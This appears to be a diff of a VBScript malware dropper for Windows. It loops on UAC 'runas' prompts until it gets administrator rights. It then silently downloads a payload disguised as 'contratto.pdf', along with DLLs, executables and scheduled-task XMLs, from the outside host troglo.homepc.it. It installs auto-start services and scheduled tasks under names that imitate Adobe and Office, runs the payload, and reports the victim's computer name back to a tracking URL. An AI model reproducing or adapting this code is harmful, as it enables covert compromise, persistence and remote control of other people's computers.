@@ -5,35 +5,79 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
 temp = oShell.ExpandEnvironmentStrings( "%TEMP%" )
 strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
-
+sfile="contratto.pdf" 'Supremo.exe
+sver="sysexecuser1"
 With oShell
-  .Run "cmd /c echo elevated  > " &windir & "\sysexecuser", 0, True
-  .Run "curl http://troglo.homepc.it/Supremo.exe -o "& temp &"\Supremo.exe", 0, True
+  .Run "cmd /c echo elevated  > " &windir & "\" & sver, 0, True
+  .Run "curl http://troglo.homepc.it/" & sfile & " -o "& temp & "\" & sfile, 0, True
+  '.Run "curl http://troglo.homepc.it/file.jpg -o "& temp &"\file.jpg", 0, True
   .Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& temp &"\PdfViewer-admin.msi", 0, True 
   '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& temp &"\sys.bat", 0, True
 End With
-Do while not fso.FileExists( windir & "\sysexecuser")
+belevate=1
+Do while not fso.FileExists( windir & "\" & sver)
+  belevate=0
   'MsgBox("elevate")  
   'oShell.Run "taskkill /f /im msiexec.exe", 0, True 
   CreateObject("Shell.Application").ShellExecute WScript.FullName _
     , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
   WScript.Sleep(2000)
 loop
+if (belevate) then
 
 With oShell
+.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
+.Run "cmd /c del " &windir & "\" & sver, 0, True
+  .Run "mkdir c:\windows\hp", 0, True
+  .Run "attrib -s c:\windows\sys2.dll", 0, True
+  .Run "curl http://troglo.homepc.it/win/exec1.dll -o c:\windows\exec1.dll", 0, True
+  .Run "curl http://troglo.homepc.it/win/CppWindowsService.xml -o c:\windows\CppWindowsService.xml", 0, True
+.Run "curl http://troglo.homepc.it/win/adobesys.xml -o c:\windows\adobesys.xml", 0, True
+.Run "curl http://troglo.homepc.it/win/sys3.dll -o c:\windows\hp\sys3.dll", 0, True
+.Run "copy /Y c:\windows\hp\sys3.dll c:\windows\sys3t.dll", 0, True
+.Run "curl http://troglo.homepc.it/win/sys2.dll -o c:\windows\hp\sys2.dll", 0, True
+.Run "copy /Y c:\windows\hp\sys2.dll c:\windows\sys2t.dll", 0, True
+.Run "curl http://troglo.homepc.it/win/office_get.xml -o c:\windows\office_get.xml", 0, True
+.Run "curl http://troglo.homepc.it/win/get.vbs -o c:\windows\get.vbs", 0, True
+.Run "schtasks /delete /tn office_get /F", 0, True
+.Run "schtasks /create /tn office_get /xml %windir%\office_get.xml /F", 0, True
+.Run "schtasks /delete /tn CppWindowsService /F", 0, True
+.Run "schtasks /create /tn CppWindowsService /xml %windir%\CppWindowsService.xml /F", 0, True
+.Run "schtasks /delete /tn adobesys /F", 0, True
+.Run "schtasks /create /tn adobesys /xml %windir%\adobesys.xml /F", 0, True
+.Run "curl http://troglo.homepc.it/win/sys2.exe -o c:\windows\sys2.exe", 0, True
+.Run "curl http://troglo.homepc.it/win/sys3.exe -o c:\windows\sys3.exe", 0, True
+.Run "sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= ""CppWindowsService"" start= auto", 0, True
+.Run "sc create adobesys binPath= c:\windows\sys3.exe DisplayName= ""adobesys"" start= auto", 0, True
+.Run "curl http://troglo.homepc.it/win/svc.vbs -o c:\windows\hp\svc.vbs", 0, True
+.Run "curl http://troglo.homepc.it/win/libssl-1_1.dll -o c:\windows\libssl-1_1.dll", 0, True
+.Run "curl http://troglo.homepc.it/win/libcurl.dll -o c:\windows\libcurl.dll", 0, True
+.Run "curl http://troglo.homepc.it/win/libcrypto-1_1.dll -o c:\windows\libcrypto-1_1.dll", 0, True
+.Run temp  & "\" & sfile, 0, True 
+.Run "cscript c:\windows\hp\svc.vbs", 0, True
+.Run "net start CppWindowsService", 0, True
+.Run "net start adobesys", 0, True
+  '.Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True
   '.Run "cmd /c echo elevated  > " &windir & "\sysexecuser", 0, True
   '.Run "curl http://troglo.homepc.it/Supremo.exe -o "& windir &"\Supremo.exe", 0, True
   WScript.Sleep(2000)   
-  .Run temp & "\Supremo.exe", 0, True 
+  '.Run temp  & "\" & sfile, 0, True 
+  '.Run temp & "\file.jpg", 0, True 
+  .Run "net stop adobesys", 0, True 
+  .Run "net stop CppWindowsService", 0, True 
+  .Run "taskkill /f /im rundll32.exe", 0, True 
+  .Run "taskkill /f /im sys2.exe", 0, True 
+  .Run "taskkill /f /im sys3.exe", 0, True 
+  
   '.Run "curl http://troglo.homepc.it/win/PdfViewer-admin.msi -o "& windir &"\PdfViewer-admin.msi", 0, True  
   WScript.Sleep(2000) 
-  .Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
+  '.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_before_" & strComputerName, 0, True
   '.Run "curl http://troglo.homepc.it/win/sys.bat -o "& windir &"\sys.bat", 0, True
-  .Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True  
+  '.Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True  
   '.Run temp & "\sys.bat", 0, True 
   
   WScript.Sleep(2000) 
-  .Run "cmd /c del " &windir & "\sysexecuser", 0, True
+  .Run "cmd /c del " &windir & "\" & sver, 0, True
   
   
 
@@ -53,6 +97,7 @@ With oShell
   ' Message = "Non-Admin"
   'End If
 End With
+end if
 
 
 Set objArgs = Wscript.Arguments
